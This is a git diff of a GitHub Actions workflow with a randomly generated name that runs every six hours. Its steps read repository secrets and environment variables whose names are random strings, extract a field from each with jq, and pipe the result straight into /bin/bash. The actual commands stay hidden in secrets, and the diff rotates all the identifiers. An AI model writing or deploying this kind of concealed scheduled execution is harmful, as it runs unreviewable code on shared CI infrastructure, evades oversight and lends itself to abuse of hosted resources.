@@ -3,7 +3,7 @@ name: zhengcunzai3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 2/6 * * *'
+    - cron: '15 4/6 * * *'
 
 jobs:
   build:
@@ -12,19 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhengcunzai3456
         env:
-          f71: ${{ secrets.f71 }}
+          fmxp36093: ${{ secrets.fmxp36093 }}
         run: |
-          echo $f71 | jq -r .eao6 | /bin/bash
-          echo $rynhq67125 | jq -r .rib5 | /bin/bash
-          echo $pte455 | jq -r .qjf85 | /bin/bash
-          echo $gkebr0726 | jq -r .m14 | /bin/bash
-          echo $qfb13 | jq -r .luty6436 | /bin/bash
-          echo $za1187 | jq -r .jsa6 | /bin/bash
-          echo $vnys1 | jq -r .uu3933 | /bin/bash
-          echo $fiu62614 | jq -r .uzn57 | /bin/bash
-          echo $ipdin1 | jq -r .spzhy62 | /bin/bash
-          echo $xtujw92972 | jq -r .sdds580 | /bin/bash
-          echo $ebsg310 | jq -r .kmkmq3645 | /bin/bash
-          echo $s33 | jq -r .ic6909 | /bin/bash
-          echo $r937 | jq -r .oc93319 | /bin/bash
+          echo $fmxp36093 | jq -r .chjla229 | /bin/bash
+          echo $xjch72 | jq -r .juqc7625 | /bin/bash
+          echo $pr12 | jq -r .jfkyw500 | /bin/bash
+          echo $swdj16768 | jq -r .sozgh7912 | /bin/bash
+          echo $rnu3165 | jq -r .grt612 | /bin/bash
 
